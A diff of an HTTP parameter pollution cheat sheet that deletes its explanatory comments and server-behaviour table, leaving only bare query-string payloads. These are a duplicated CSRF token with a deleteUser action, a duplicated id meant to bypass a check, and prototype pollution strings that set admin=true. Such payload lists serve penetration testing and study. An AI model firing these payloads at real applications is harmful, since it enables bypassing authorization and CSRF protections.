@@ -1,44 +1,10 @@
-# ============================================================
-# HTTP Parameter Pollution — Server/Framework Behaviors
-# ============================================================
-
-# ---- How Different Servers Handle Duplicate Params ----
-# Apache Tomcat:      First occurrence wins
-# ASP.NET/IIS:        All occurrences (comma-separated)
-# PHP:                Last occurrence wins
-# JSP:                First occurrence wins
-# Perl (CGI):         First occurrence wins
-# Python (Django):    Last occurrence wins (getlist() gets all)
-# Ruby on Rails:      Last occurrence wins
-# Node.js (Express):  First occurrence wins (qs: last wins)
-
-# ---- Test Payloads for Each Behavior ----
-# Test: ?color=red&color=blue
-# → If response says "red": first wins (Apache)
-# → If response says "blue": last wins (PHP/Rails)
-# → If response says "red,blue": all merged (ASP.NET)
-
-# ---- PHP (last wins) Attack ----
-# If signature check uses $_GET['token'][0] but action uses $_GET['token']
 ?token=VALID_CSRF_TOKEN&action=deleteUser&token=FORGED
 
-# ---- ASP.NET (all merged) Attack ----
-# Security check: if (token != "EXPECTED") block
-# Bypass: ?token=EXPECTED&token=PAYLOAD
-# Merged: "EXPECTED,PAYLOAD" → != "EXPECTED" → bypasses check?
-# OR: ?role=user,admin (parsed as array, check for 'user' passes)
-
-# ---- Flask/Django getlist() Attack ----
-# Django: request.GET.get('id') → last value
-# Django: request.GET.getlist('id') → all values
-# If app uses .get() but expects one value:
 ?id=1&id=2  →  id = "2" (last) may bypass check expecting "1"
 
-# ---- Express.js (qs library) ----
 ?a[b]=c  →  {a: {b: 'c'}}
 ?a[]=1&a[]=2  →  {a: ['1','2']}
 ?a[__proto__][admin]=true  →  Prototype Pollution!
 
-# ---- Prototype Pollution via HPP (Node/Express) ----
 ?__proto__[admin]=true
 ?constructor[prototype][admin]=true
